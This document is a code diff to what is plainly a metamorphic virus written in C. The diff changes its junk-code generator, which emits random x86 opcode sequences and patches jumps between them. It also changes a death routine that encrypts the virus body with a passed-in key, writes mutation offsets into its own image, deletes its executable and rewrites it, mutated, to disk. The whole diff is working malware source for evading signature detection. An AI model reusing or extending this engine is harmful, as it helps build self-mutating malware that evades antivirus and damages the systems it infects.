@@ -25,13 +25,26 @@ void junk_war(void);
 void junk_pestilence(void);
 
 void junk_death(void) {
-	char tmp = 0;
-	char a = 0;
-	char b = 0;
+	char a;
+	char b;
+	char c;
 
-	tmp = a;
-	a = b;
-	b = tmp;
+	a = 1; 
+	b = 2;
+	c = 3;
+
+	for (int i = 0; i < 100; i++) {
+		a += b;
+		b += c;
+		c += a;
+		if (a > b) {
+			a = b;
+		} else if (b > c) {
+			b = c;
+		} else if (c > a) {
+			c = a;
+		}
+	}
 }
 
 static inline uint8_t ft_nrand(void) {
@@ -157,14 +170,14 @@ static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2, int file_off) {
 					jmp_index = instr_count;
 				} else {
 					nop[offset] = get_random_opcode(ft_nrand());
-					nop[offset + 1] = 0xC0 + reg_2 + (reg_1 << 3);
+					nop[offset + 1] = 0xC0 | reg_2 | (reg_1 << 3);
 				}
 				break;
 
 			case 3:
 				nop[offset] = 0x48;
 				nop[offset + 1] = get_random_opcode(ft_nrand());
-				nop[offset + 2] = 0xC0 + reg_1 + (reg_2 << 3);
+				nop[offset + 2] = 0xC0 | reg_1 | (reg_2 << 3);
 				break;
 
 			case 4:
@@ -206,13 +219,14 @@ static void fill_nop(uint8_t *nop, uint8_t reg_1, uint8_t reg_2, int file_off) {
 
 	}
 
+	/* prepare the jmp patch */
+
 	instr_off[instr_count++] = NOPS_LEN;
 
 	if (jmp_index != -1) {
 		uint8_t *jmp_val = nop + instr_off[jmp_index] + 1;
 
 		if (jmp_index + 1 < instr_count) {
-			//patch_jmp(jmp_val, instr_off + jmp_index + 1, instr_count - jmp_index - 1, instr_off[jmp_index]);
 			patch_jmp(jmp_val, &instr_off[jmp_index + 1], instr_count - jmp_index - 1, instr_off[jmp_index]);
 		}
 	}
@@ -245,7 +259,17 @@ static void gen_junk(uint8_t *rdm_junk, int file_off) {
 	JUNK;
 }
 
+#ifdef DEBUG
+//static void print_junk_offsets(void) {
+//	for (size_t i = 0; i < g_nb_junk; i++) {
+//		_printf(STR("g_junk_offsets[%d]: %d\n"), i, g_junk_offsets[i]);
+//	}
+//}
+#endif
+
 static void replace_nop(uint8_t *self, int *junk_offsets) {
+
+	//print_junk_offsets();
 
 	for (size_t i = 0; i < g_nb_junk; i++) {
 
@@ -298,38 +322,42 @@ void mutate(void) {
 	JUNK;
 }
 
-int death(int start_offset, file_t *file) {
+static void write_self_pos(uint8_t *entry) {
 
+	uintptr_t junk_pos = (uintptr_t)&g_junk_offsets - (uintptr_t)&_start;
+	uint8_t *junk = (uint8_t *)(entry + junk_pos);
+	ft_memcpy(junk, g_junk_offsets, sizeof(g_junk_offsets));
 
-	JUNK;
+	uintptr_t junk_size = (uintptr_t)&g_nb_junk - (uintptr_t)&_start;
+	uint8_t *size = (uint8_t *)(entry + junk_size);
+	ft_memcpy(size, &g_nb_junk, sizeof(g_nb_junk));
+}
 
-	uint8_t *self = (uint8_t *)file->view.data;
+int death(int start_offset, int64_t key, file_t *file) { JUNK;
+
+	uint8_t *self = (uint8_t *)file->view.data; JUNK;
 	char *self_name = file->abs_path;
 	int fd = -1;
+	bool is_encrypted = (start_offset != 0x1000) ? true : false;
 
 	uint8_t *entry = self + start_offset;
 
-	if (start_offset != 0x1000) 
-		encrypt(entry, VIRUS_SIZE, g_key);
+	if (is_encrypted) {
+		encrypt(entry, VIRUS_SIZE, key);
+		replace_nop(entry, g_junk_offsets);
+	} else {
+		write_self_pos(entry);
+		replace_nop(entry, g_junk_offsets);
+	}
 
-
-	JUNK;
-
-	replace_nop(entry, g_junk_offsets);
-
-	uintptr_t junk_pos = (uintptr_t)&g_junk_offsets - (uintptr_t)&_start;
-	uint8_t *junk = self + junk_pos + start_offset;
-	ft_memcpy(junk, g_junk_offsets, sizeof(g_junk_offsets));
-
-	if (start_offset != 0x1000)
-		encrypt(entry, VIRUS_SIZE, g_key);
+	if (is_encrypted) {
+		encrypt(entry, VIRUS_SIZE, key);
+	}
 
 	if (unlink(self_name) == -1) {
 		munmap(self, file->view.size);
 		return -1;
-	}
-
-	JUNK;
+	} JUNK;
 
 	fd = open(self_name, O_CREAT | O_WRONLY | O_TRUNC, file->mode);
 	if (fd == -1)
@@ -340,9 +368,7 @@ int death(int start_offset, file_t *file) {
 		close(fd);
 		munmap(self, file->view.size);
 		return -1;
-	}
-
-	JUNK;
+	} JUNK;
 
 	if (munmap(self, file->view.size) == -1) {
 		close(fd);
